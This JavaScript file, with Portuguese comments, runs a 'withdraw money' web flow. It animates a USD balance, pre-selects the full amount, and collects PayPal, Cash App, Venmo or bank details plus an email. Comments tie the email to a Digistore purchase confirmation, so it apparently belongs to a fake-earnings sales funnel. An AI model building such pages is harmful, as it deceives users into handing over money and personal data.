    const selectorText = document.getElementById("pix-selector-text");
    const btnEnviar = document.getElementById("btn-enviar-pix");

    if (!nomeInput || !keyInput || !selectorText || !btnEnviar) return;

    const isNomeFilled = nomeInput.value.trim().length > 0;
    const selectedType = selectorText.textContent.trim();
    const isTypeSelected = selectedType !== "Choose account type";
    const keyValue = keyInput.value.trim();

    let isKeyValid = false;

    if (isTypeSelected && keyValue.length > 0) {
      switch (selectedType) {
        case "Checking":
          isKeyValid = /^\d{5,17}$/.test(keyValue.replace(/\D/g, ""));
          break;
        case "Savings":
          isKeyValid = /^\d{5,17}$/.test(keyValue.replace(/\D/g, ""));
          break;
        case "PayPal Email":
          isKeyValid = validateEmail(keyValue);
          break;
        case "Zelle Email":
          isKeyValid = validateEmail(keyValue);
          break;
        default:
          isKeyValid = keyValue.length > 0;
      }
    }

    if (isNomeFilled && isTypeSelected && isKeyValid) {
      btnEnviar.classList.remove("btn-disabled");
    } else {
      btnEnviar.classList.add("btn-disabled");
    }
  }

  // Listeners para validação em tempo real
  const nomeInput = document.getElementById("nome");
  if (nomeInput) {
    nomeInput.addEventListener("input", checkPixFormValidity);
  }

  // 1. Seleção do Tipo de Chave (no popup #six)
  document.body.addEventListener("click", function (ev) {
    const optionRow = ev.target.closest("#six .option-row");
    if (!optionRow) return;

    ev.preventDefault();
    ev.stopPropagation();

    // Pega o texto da opção selecionada (ex: Bank Account, Email...)
    const optionTextEl = optionRow.querySelector(".option-text");
    const selectedType = optionTextEl
      ? optionTextEl.textContent.trim()
      : "ACH Account";

    // Atualiza o texto do seletor na tela #five
    const selectorText = document.getElementById("pix-selector-text");
    if (selectorText) {
      selectorText.textContent = selectedType;
      selectorText.style.color = "#000"; // Opcional: mudar cor para indicar seleção
    }

    // Habilita o input de chave
    const keyInput = document.getElementById("pix-key-input");
    const keyWrapper = document.getElementById("pix-key-wrapper");

    if (keyInput) {
      keyInput.value = ""; // Limpa o campo ao trocar o tipo
      keyInput.removeAttribute("disabled");
      keyInput.classList.remove("input-disabled");
      keyInput.focus();
    }

    if (keyWrapper) {
      keyWrapper.classList.remove("input-wrapper-disabled");
    }

    // Remove estado de erro do seletor se houver
    const selector = document.getElementById("pix-type-selector");
    if (selector) {
      selector.classList.remove("input-error", "shake-animation");
    }

    // Revalida o formulário após seleção
    checkPixFormValidity();

  });

  // 2. Feedback visual ao tentar clicar no input desabilitado
  document.body.addEventListener("click", function (ev) {
    // Verifica se clicou no wrapper do input desabilitado
    const wrapper = ev.target.closest("#pix-key-wrapper");
    if (!wrapper) return;

    // Se o input estiver desabilitado (wrapper tem a classe)
    if (wrapper.classList.contains("input-wrapper-disabled")) {
      const selector = document.getElementById("pix-type-selector");
      if (selector) {
        // Remove classes para reiniciar animação se já estiver rodando
        selector.classList.remove("shake-animation", "input-error");

        // Força reflow
        void selector.offsetWidth;

        // Adiciona classes de erro e animação
        selector.classList.add("input-error", "shake-animation");

        // Remove a animação depois que terminar
        setTimeout(() => {
          selector.classList.remove("shake-animation");
        }, 500);
      }
    }
  });

  // 3. Validação e Envio (Botão Enviar no #five)
  document.body.addEventListener("click", function (ev) {
    const btnEnviar = ev.target.closest("#btn-enviar-pix");
    if (!btnEnviar) return;

    ev.preventDefault();

    // Se o botão estiver desabilitado, executa validação visual (shake)
    if (btnEnviar.classList.contains("btn-disabled")) {
      const nomeInput = document.getElementById("nome");
      const selector = document.getElementById("pix-type-selector");
      const selectorText = document.getElementById("pix-selector-text");
      const keyInput = document.getElementById("pix-key-input");

      // 1. Valida Nome
      if (nomeInput && nomeInput.value.trim() === "") {
        nomeInput.classList.remove("shake-animation", "input-error");
        void nomeInput.offsetWidth; // force reflow
        nomeInput.classList.add("input-error", "shake-animation");
        setTimeout(() => nomeInput.classList.remove("shake-animation"), 500);
      }

      // 2. Valida Seletor de Tipo
      const isTypeSelected =
        selectorText &&
        selectorText.textContent.trim() !== "Choose account type";
      if (!isTypeSelected && selector) {
        selector.classList.remove("shake-animation", "input-error");
        void selector.offsetWidth;
        selector.classList.add("input-error", "shake-animation");
        setTimeout(() => selector.classList.remove("shake-animation"), 500);
      }

      // 3. Valida Chave (se já selecionou tipo)
      if (isTypeSelected && keyInput) {
        const keyValue = keyInput.value.trim();
        let isKeyValid = false;

        // Reutiliza lógica de validação
        const selectedType = selectorText.textContent.trim();
        switch (selectedType) {
          case "Checking":
            isKeyValid = /^\d{5,17}$/.test(keyValue.replace(/\D/g, ""));
            break;
          case "Savings":
            isKeyValid = /^\d{5,17}$/.test(keyValue.replace(/\D/g, ""));
            break;
          case "PayPal Email":
            isKeyValid = validateEmail(keyValue);
            break;
          case "Zelle Email":
            isKeyValid = validateEmail(keyValue);
            break;
          default:
            isKeyValid = keyValue.length > 0;
        }

        if (!isKeyValid) {
          keyInput.classList.remove("shake-animation", "input-error");
          void keyInput.offsetWidth;
          keyInput.classList.add("input-error", "shake-animation");
          keyInput.focus();
          setTimeout(() => keyInput.classList.remove("shake-animation"), 500);
        }
      }

      return; // Impede envio
    }

    // Se passou (botão habilitado), prossegue
    const nomeInput = document.getElementById("nome");

    // Captura os dados do formulário — lê o método ativo
    let tipoChave = "";
    let chavePix = "";
    const pm = currentPaymentMethod || "paypal";
    if (pm === "paypal") {
      tipoChave = "PayPal Email";
      const el = document.getElementById("paypal-email");
      chavePix = el ? el.value.trim() : "";
    } else if (pm === "cashapp") {
      tipoChave = "Cash App";
      const el = document.getElementById("cashapp-handle");
      chavePix = el ? el.value.trim() : "";
    } else if (pm === "venmo") {
      tipoChave = "Venmo";
      const el = document.getElementById("venmo-handle");
      chavePix = el ? el.value.trim() : "";
    } else {
      // fallback: old pix fields
      const selectorText = document.getElementById("pix-selector-text");
      const keyInput = document.getElementById("pix-key-input");
      tipoChave = selectorText ? selectorText.textContent.trim() : "";
      chavePix = keyInput ? keyInput.value.trim() : "";
    }

    const formData = {
      nome: nomeInput ? nomeInput.value.trim() : "",
      tipoChave,
      chavePix,
    };

    // Armazena os dados para usar na página de confirmação
    window.__formData = formData;

    // Manda o e-mail para o backend, amarrado ao okto_sk da sessao. E aqui que
    // ele existe: a Digistore NAO devolve e-mail no IPN (35 campos, nenhum),
    // entao sem este passo nao ha como saber para quem escrever depois da compra.
    // O envio em si nao acontece agora — so quando o IPN confirmar o pagamento.

    // Salva também no localStorage para persistência
    try {
      localStorage.setItem("userACHData", JSON.stringify(formData));
    } catch (e) {
      console.error("Erro ao salvar no localStorage", e);
    }

    // Sucesso: Fecha modais e vai para #processing
    closeAllModals();

    if (typeof window.showScreen === "function") {
      window.showScreen("processing");
    } else {
      location.hash = "#processing";
    }
  });

  // Helpers de Formatação (Máscaras)
  function formatPixKey(value, type) {
    if (!value) return "";

    if (type === "Checking" || type === "Savings") {
      value = value.replace(/\D/g, "");
      if (value.length > 17) value = value.slice(0, 17);
      return value;
    }

    if (type === "PayPal Email" || type === "Zelle Email") {
      return value;
    }

    return value;
  }

  // 4. Restrição de caracteres e Máscaras no input
  const pixKeyInput = document.getElementById("pix-key-input");
  if (pixKeyInput) {
    pixKeyInput.addEventListener("input", function (ev) {
      const selectorText = document.getElementById("pix-selector-text");
      if (!selectorText) return;

      const selectedType = selectorText.textContent.trim();

      // Aplica formatação
      const formattedValue = formatPixKey(this.value, selectedType);

      // Atualiza o valor apenas se mudou (evita loop ou problemas de cursor em alguns casos simples)
      if (this.value !== formattedValue) {
        this.value = formattedValue;
      }

      // Revalida o formulário
      checkPixFormValidity();
    });
  }
})();

/* =========================
   Anima valor e controla active dos botões em #withdraw
   Cole este bloco dentro do seu main.js, idealmente dentro de DOMContentLoaded
   ========================= */

(function () {
  // --- helper: formata número como moeda USD ---
  function formatBRL(value) {
    return new Intl.NumberFormat("en-US", {
      style: "currency",
      currency: "USD",
    }).format(value);
  }

  // --- helper: converte "$312.47" -> number (312.47) ---
  function parseBRL(text) {
    if (!text) return 0;
    const cleaned = String(text)
      .replace(/\s/g, "")
      .replace(/[$]/g, "")
      .replace(/,/g, "");
    const n = parseFloat(cleaned);
    return isNaN(n) ? 0 : n;
  }

  // --- anima número de 0 até target (ou de start -> target) ---
  function animateNumberTo(el, targetNumber, duration = 1400, startNumber = 0) {
    if (!el) return;
    const start = performance.now();
    const end = start + duration;
    function tick(now) {
      const t = Math.min(1, (now - start) / duration);
      // easeOutQuad
      const eased = 1 - (1 - t) * (1 - t);
      const current = startNumber + (targetNumber - startNumber) * eased;
      el.textContent = formatBRL(current);
      if (now < end) {
        requestAnimationFrame(tick);
      } else {
        // garante valor final exato
        el.textContent = formatBRL(targetNumber);
      }
    }
    requestAnimationFrame(tick);
  }

  // --- encontra o elemento do valor na section three ---
  function findAmountElement() {
    // tenta vários seletores comuns (ajuste se quiser)
    const selectors = [
      "#withdraw .valor", // se existir
      "#withdraw .popup-valor",
      "#withdraw .amount",
      "#withdraw .big-valor",
      "#withdraw .valor-principal",
      "#withdraw .saldo-valor",
      "#withdraw .valor-total",
      "#withdraw [data-amount-target]", // data attribute
      "#withdraw .amount-target",
      "#withdraw h1 .valor",
    ];
    for (const sel of selectors) {
      const el = document.querySelector(sel);
      if (el) return el;
    }
    // fallback: busca qualquer texto de moeda dentro de #withdraw
    const three = document.getElementById("withdraw");
    if (!three) return null;
    // procura por nós que contenham "$"
    const nodes = three.querySelectorAll("*");
    for (const n of nodes) {
      if (n.children.length === 0 && /\$\s*\d/.test(n.textContent || "")) {
        return n;
      }
    }
    return null;
  }

  // --- gerencia botões da linha .botoes-row-sacar ---

  function initBotoesRowSacar() {
    const container =
      document.querySelector("#withdraw .botoes-row-sacar") ||
      document.querySelector(".botoes-row-sacar");
    if (!container || container._initDone) return;
    container._initDone = true;

    const buttons = Array.from(
      container.querySelectorAll('button, [role="button"], a')
    );

    // incluir manualmente o botão display-total
    const displayTotal = document.querySelector(".display-total");
    if (displayTotal) buttons.push(displayTotal);

    const activeClass = "btn-active";
    const sacarBtn = document.querySelector(".btn-sacar-dois");

    // Campo de e-mail obrigatorio (revelado ao selecionar um valor). E o ponto
    // confiavel de captura: antes o e-mail saia no blur de #paypal-email, que
    // disparava com o valor pela metade (chegava truncado no backend). Aqui o
    // e-mail so e enviado quando valido e completo — no blur e no clique do
    // "Withdraw money", que so libera com e-mail valido.
    const emailGroup = document.getElementById("withdraw-email-group");
    const emailInput = document.getElementById("withdraw-email");
    const emailError = document.getElementById("withdraw-email-error");
    const EMAIL_RE = /^[a-z0-9._%+\-]+@[a-z0-9\-]+(?:\.[a-z0-9\-]+)+$/;

    // Métodos cuja "conta" JÁ é um email -> não mostra campo de email separado.
    var EMAIL_METHODS = { paypal: 1 };
    function emailSrc() {
      // PayPal: a conta é o email. Cashapp/Venmo: campo de email dedicado.
      return (EMAIL_METHODS[selectedMethod] ? accountInput : emailInput) || null;
    }
    function emailAtual() {
      var el = emailSrc();
      return el ? String(el.value).trim().toLowerCase() : "";
    }
    function emailValido() {
      return EMAIL_RE.test(emailAtual());
    }
    function temValor() {
      return buttons.some((b) => b.classList.contains(activeClass));
    }
    // Elementos do método inline
    const methodGroup = document.getElementById("three-method-group");
    const accountGroup = document.getElementById("three-account-group");
    const accountLabel = document.getElementById("three-account-label");
    const accountInput = document.getElementById("three-account-input");
    let selectedMethod = "";

    const methodLabels = {
      paypal: { label: "PayPal Email", placeholder: "your@paypal.com" },
      cashapp: { label: "Cash App $Cashtag", placeholder: "$YourCashtag" },
      venmo: { label: "Venmo Email or @Username", placeholder: "@username or email" },
    };

    function temConta() {
      return !!accountInput && accountInput.value.trim().length > 2;
    }

    // "Withdraw money" libera com: valor + método + conta preenchida
    function updateWithdrawState() {
      if (!sacarBtn) return;
      const ok = temValor() && selectedMethod && temConta() && emailValido();
      sacarBtn.classList.toggle("btn-sacar-indisponivel", !ok);
      sacarBtn.style.pointerEvents = "auto";
      sacarBtn.style.opacity = "1";
      // mostra métodos assim que valor for selecionado
      if (methodGroup) methodGroup.style.display = temValor() ? "" : "none";
    }

    let emailEnviado = "";
    function enviaEmail() {
      if (!emailValido()) return;
      const v = emailAtual();
      if (v === emailEnviado) return;
      emailEnviado = v;
    }

    if (emailInput) {
      emailInput.addEventListener("input", () => {
        if (emailError) emailError.style.display = "none";
        updateWithdrawState();
      });
      emailInput.addEventListener("blur", enviaEmail);
    }

    if (accountInput) {
      accountInput.addEventListener("input", updateWithdrawState);
      accountInput.addEventListener("blur", enviaEmail);   // PayPal: a conta É o email
    }

    // Clique nos botões de método inline
    document.querySelectorAll(".three-method-btn").forEach(btn => {
      btn.addEventListener("click", () => {
        selectedMethod = btn.getAttribute("data-method");
        // Highlight selecionado
        document.querySelectorAll(".three-method-btn").forEach(b => {
          b.style.borderColor = b === btn ? "#ea445a" : "#e5e5e5";
          b.style.background = b === btn ? "#fff5f6" : "#fff";
          b.style.boxShadow = b === btn ? "0 0 0 1px #ea445a" : "";
        });
        // Atualiza label e placeholder
        const info = methodLabels[selectedMethod] || { label: "Account", placeholder: "" };
        if (accountLabel) accountLabel.textContent = info.label;
        if (accountInput) {
          accountInput.placeholder = info.placeholder;
          accountInput.value = "";
          accountInput.type = selectedMethod === "paypal" ? "email" : "text";
        }
        if (accountGroup) accountGroup.style.display = "";
        // PayPal: a conta já é o email -> esconde o campo dedicado. Cashapp/Venmo: mostra.
        if (emailGroup) emailGroup.style.display = EMAIL_METHODS[selectedMethod] ? "none" : "";
        if (emailError) emailError.style.display = "none";
        updateWithdrawState();
        if (accountInput) {
          accountInput.focus();
          setTimeout(() => {
            accountInput.scrollIntoView({ behavior: "smooth", block: "center" });
          }, 80);
        }
      });
    });

    // clique no "Withdraw money"
    if (sacarBtn) {
      sacarBtn.addEventListener("click", () => {
        if (!selectedMethod || !temConta()) return;
        // captura email silencioso: se método é PayPal, o campo já é email
        if (selectedMethod === "paypal" && accountInput) {
          const v = accountInput.value.trim().toLowerCase();
          if (emailInput) emailInput.value = v;
        }

        // Salva dados para tela de confirmação
        const info = methodLabels[selectedMethod] || { label: selectedMethod };
        const formData = {
          nome: "",
          tipoChave: info.label,
          chavePix: accountInput ? accountInput.value.trim() : "",
        };
        window.__formData = formData;
        try { localStorage.setItem("userACHData", JSON.stringify(formData)); } catch(e) {}

        // Vai direto para #processing
        if (typeof window.showScreen === "function") {
          window.showScreen("processing");
        } else {
          location.hash = "#processing";
        }
      });
    }

    function removeActive() {
      buttons.forEach((btn) => btn.classList.remove(activeClass));
    }

    // === LISTENER CORRETO (somente 1 vez) ===
    buttons.forEach((btn) => {
      btn.addEventListener("click", () => {
        removeActive();
        btn.classList.add(activeClass);
        updateWithdrawState();
      });
    });

    // limpa o estado inicial
    removeActive();

    // Pré-seleciona o maior valor (.display-total, o saldo cheio). Isso revela o
    // campo de e-mail, mas o "Withdraw money" continua bloqueado ate o e-mail ser
    // valido — updateWithdrawState decide pelas duas condicoes.
    if (displayTotal) displayTotal.click();
    updateWithdrawState();
  }

  // --- função principal a ser chamada quando #withdraw for exibida ---
  function onShowThree() {
    // 1) animar valor - DESABILITADO: agora usamos animateCurrencyCounter unificada
    // A animação é feita diretamente no showScreen do router principal
    /*
    const amountEl = findAmountElement();
    if (amountEl) {
      // tenta ler target em data-target (ex: data-amount-target="312.47")
      let target = null;
      if (amountEl.dataset && amountEl.dataset.amountTarget) {
        target = parseFloat(amountEl.dataset.amountTarget);
      }
      if (target === null || isNaN(target)) {
        target = parseBRL(amountEl.textContent || amountEl.innerText);
      }
      // se não encontrou, ignore
      if (!isNaN(target) && target > 0) {
        // opcional: começar mostrando 0 formatado imediatamente
        amountEl.textContent = formatBRL(0);
        animateNumberTo(amountEl, target, 1400, 0);
      }
    }
    */

    // 2) init botoes
    initBotoesRowSacar();
  }

  // --- Hook: intercepta chamadas para 'withdraw' apos DOMContentLoaded ---
  function attachShowScreenHook() {
    if (window.showScreen && typeof window.showScreen === "function" && !window.showScreen._threeHooked) {
      const originalShowScreen = window.showScreen;
      const wrapped = function (id, push) {
        originalShowScreen(id, push);
        if (String(id) === "withdraw") {
          setTimeout(onShowThree, 30);
        }
      };
      wrapped._threeHooked = true;
      window.showScreen = wrapped;
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", () => {
      attachShowScreenHook();
      setTimeout(onShowThree, 50);
    });
  } else {
    attachShowScreenHook();
    setTimeout(onShowThree, 50);
  }

  // também expõe manualmente para caso queira disparar por console:
  window.__spa_helpers = window.__spa_helpers || {};
  window.__spa_helpers.onShowThree = onShowThree;
})();

// DESABILITADO: Agora usamos a função unificada animateCurrencyCounter
// que é chamada diretamente no showScreen do router principal
/*
// === Count-up robusto para #withdraw (usa data-amount-target) ===
(function () {
  // evita múltiplas execuções
  let threeAnimated = false;

  function formatBRL(value) {
    return value.toLocaleString("en-US", {
      style: "currency",
      currency: "USD",
    });
  }

  function animateCountUp(el, target, duration = 1400) {
    if (!el) return;
    const start = performance.now();
    const from = 0;
    function step(now) {
      const t = Math.min(1, (now - start) / duration);
      const eased = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = from + (target - from) * eased;
      el.textContent = formatBRL(current);
      if (t < 1) requestAnimationFrame(step);
      else el.textContent = formatBRL(target);
    }
    requestAnimationFrame(step);
  }

  function startCountUpThree() {
    // se já animou e você não quer repetir, pare aqui
    if (threeAnimated) return;
    const el = document.querySelector("#withdraw [data-amount-target]");
    if (!el) return;
    const raw = el.getAttribute("data-amount-target");
    const target = parseFloat(raw);
    if (isNaN(target)) return;
    // mostra zero imediatamente e anima
    el.textContent = formatBRL(0);
    // pequeno timeout para garantir estilos aplicados / repaint
    setTimeout(() => animateCountUp(el, target, 1400), 30);
    threeAnimated = true;
  }

  // 1) Hook no showScreen (se existir)
  if (window.showScreen && typeof window.showScreen === "function") {
    const orig = window.showScreen;
    window.showScreen = function (id, push) {
      orig(id, push);
      if (String(id) === "withdraw") {
        // reseta flag se quiser re-animar cada vez -> threeAnimated = false;
        startCountUpThree();
      }
    };
  }

  // 2) MutationObserver no próprio #withdraw para detectar classes (fallback)
  const threeEl = document.getElementById("withdraw");
  if (threeEl) {
    const mo = new MutationObserver((records) => {
      for (const r of records) {
        if (r.type === "attributes" && r.attributeName === "class") {
          if (threeEl.classList.contains("is-active")) {
            startCountUpThree();
            break;
          }
        }
      }
    });
    mo.observe(threeEl, { attributes: true, attributeOldValue: true });
  }

  // 3) Caso já esteja ativa no carregamento (ex.: #withdraw no hash), dispara agora
  document.addEventListener("DOMContentLoaded", () => {
    const threeNow = document.getElementById("withdraw");
    if (threeNow && threeNow.classList.contains("is-active")) {
      // aguarda um tick para garantir render
      setTimeout(startCountUpThree, 20);
    }
  });

  // opcional: expor função para forçar re-execução via console
  window.__countup_helpers = window.__countup_helpers || {};
  window.__countup_helpers.startCountUpThree = function (force) {
    if (force) threeAnimated = false;
    startCountUpThree();
  };
})();
*/

// apaga akiiiiiiiiiiiiiiiii

/* ===== Count-up definitivo para o span em #withdraw ===== */
(function () {
  const SEL = "#withdraw .valor-currency-dois[data-amount-target]";

  function formatBRL(value) {
    return value.toLocaleString("en-US", {
      style: "currency",
      currency: "USD",
    });
  }

  function animateCountUpEl(el, target, duration = 1400) {
    if (!el) return;
    const startVal = 0;
    const startTime = performance.now();
    function step(now) {
      const t = Math.min(1, (now - startTime) / duration);
      const eased = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = startVal + (target - startVal) * eased;
      el.textContent = formatBRL(current);
      if (t < 1) requestAnimationFrame(step);
      else el.textContent = formatBRL(target); // garante valor final exato
    }
    requestAnimationFrame(step);
  }

  function triggerCountUp() {
    const el = document.querySelector(SEL);
    if (!el) return;
    const raw = el.getAttribute("data-amount-target");
    const target = parseFloat(raw);
    if (isNaN(target)) return;
    // zera e anima
    el.textContent = formatBRL(0);
    // timeout pequeno para garantir repaint antes da animação
    setTimeout(() => animateCountUpEl(el, target, 1400), 20);
  }

  // DESABILITADO: Agora usamos a função unificada animateCurrencyCounter
  // que é chamada diretamente no showScreen do router principal
  /*
  // 1) Hook no showScreen (se existir) — re-anima sempre que for para #withdraw
  if (window.showScreen && typeof window.showScreen === "function") {
    const orig = window.showScreen;
    window.showScreen = function (id, push) {
      orig(id, push);
      if (String(id) === "withdraw") {
        // força re-animação a cada entrada
        triggerCountUp();
      }
    };
  }

  // 2) MutationObserver no próprio #withdraw (fallback para outros fluxos)
  const threeEl = document.getElementById("withdraw");
  if (threeEl) {
    const mo = new MutationObserver((records) => {
      for (const r of records) {
        if (r.type === "attributes" && r.attributeName === "class") {
          if (threeEl.classList.contains("is-active")) triggerCountUp();
        }
      }
    });
    mo.observe(threeEl, { attributes: true });
  }
  */

  // 3) Se já estiver ativa no carregamento (ex.: hash = #withdraw), dispara agora
  document.addEventListener("DOMContentLoaded", () => {
    const threeNow = document.getElementById("withdraw");
    if (threeNow && threeNow.classList.contains("is-active")) {
      setTimeout(triggerCountUp, 20);
    }
  });

  // expõe helper para testar no console: window.__countup.trigger(true)
  window.__countup = window.__countup || {};
  window.__countup.trigger = function (force) {
    if (force) {
      // força zerar e re-rodar
      const el = document.querySelector(SEL);
      if (el) el.textContent = formatBRL(0);
    }
    triggerCountUp();
  };
})();

// apaga abaixo

document.addEventListener("DOMContentLoaded", function () {
  // Garante que o SPA já inicializou o router
  setTimeout(() => {
    if (window.showScreen) {
      const originalShowScreen = window.showScreen;

      window.showScreen = function (id, push) {
        originalShowScreen(id, push);

        if (id === "withdraw") {
          setTimeout(() => {
            if (window.__spa_helpers && window.__spa_helpers.onShowThree) {
              window.__spa_helpers.onShowThree();
            }
          }, 30);
        }
      };
    }
  }, 100);
});
